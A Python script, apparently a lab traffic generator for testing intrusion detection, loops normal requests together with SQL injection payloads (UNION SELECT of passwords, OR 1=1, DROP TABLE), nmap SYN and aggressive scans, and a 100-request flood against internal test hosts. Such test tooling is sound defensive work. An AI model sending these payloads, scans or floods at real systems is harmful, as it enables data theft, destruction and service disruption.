#!/usr/bin/env python3

import requests
import nmap
import time
import random
from datetime import datetime
import psycopg2

def generate_normal_traffic(web_server_url):
    """Genera traffico web normale"""
    try:
        response = requests.get(web_server_url)
        print(f"Normal request to {web_server_url}: {response.status_code}")
    except Exception as e:
        print(f"Error generating normal traffic: {e}")

def generate_sql_injection_traffic(web_server_url):
    """Genera tentativi di SQL injection via HTTP"""
    payloads = [
        "?id=1 UNION SELECT username,password FROM users",
        "?id=1 OR 1=1",
        "?username=admin' OR '1'='1",
        "?input='; DROP TABLE users;--"
    ]
    
    for payload in payloads:
        try:
            url = f"{web_server_url}{payload}"
            response = requests.get(url)
            print(f"SQL injection attempt: {url}")
        except Exception as e:
            print(f"Error in SQL injection attempt: {e}")

def scan_ports(target):
    """Esegue una scansione delle porte usando nmap"""
    nm = nmap.PortScanner()
    try:
        # Scansione SYN
        nm.scan(target, arguments='-p 80,443,5432 -sS')
        print(f"SYN scan completed on {target}")
        
        # Scansione aggressiva
        nm.scan(target, arguments='-p 80,443,5432 -A')
        print(f"Aggressive scan completed on {target}")
    except Exception as e:
        print(f"Error in port scanning: {e}")

def generate_dos_traffic(web_server_url):
    """Simula un attacco DoS generando molte richieste"""
    for _ in range(100):
        try:
            requests.get(web_server_url)
        except:
            pass
    print("DoS traffic generated")

def test_postgres_connection(db_host):
    """Testa la connessione PostgreSQL con tentativi di SQL injection"""
    sql_injection_attempts = [
        "SELECT * FROM users WHERE username = '' UNION SELECT * FROM users--",
        "SELECT * FROM users WHERE username = 'admin' OR '1'='1'",
        "SELECT * FROM users; DROP TABLE users;--"
    ]
    
    try:
        conn = psycopg2.connect(
            dbname="testdb",
            user="testuser",
            password="testpass",
            host=db_host
        )
        cur = conn.cursor()
        
        for attempt in sql_injection_attempts:
            try:
                print(f"Attempting SQL injection: {attempt}")
                # Non eseguiamo realmente la query per sicurezza
                # cur.execute(attempt)
            except Exception as e:
                print(f"SQL injection attempt failed: {e}")
                
    except Exception as e:
        print(f"Database connection error: {e}")
    finally:
        if 'conn' in locals():
            conn.close()

def main():
    WEB_SERVER = "http://web-server"
    DB_HOST = "database"
    
    while True:
        # Traffico normale
        generate_normal_traffic(WEB_SERVER)
        time.sleep(2)
        
        # SQL Injection via HTTP
        generate_sql_injection_traffic(WEB_SERVER)
        time.sleep(2)
        
        # Port scanning
        scan_ports("web-server")
        time.sleep(2)
        
        # DoS traffic
        generate_dos_traffic(WEB_SERVER)
        time.sleep(2)
        
        # PostgreSQL tests
        test_postgres_connection(DB_HOST)
        time.sleep(5)

if __name__ == "__main__":
    # Attendi che i servizi siano pronti
    time.sleep(30)
    print("Starting traffic generation...")
    main()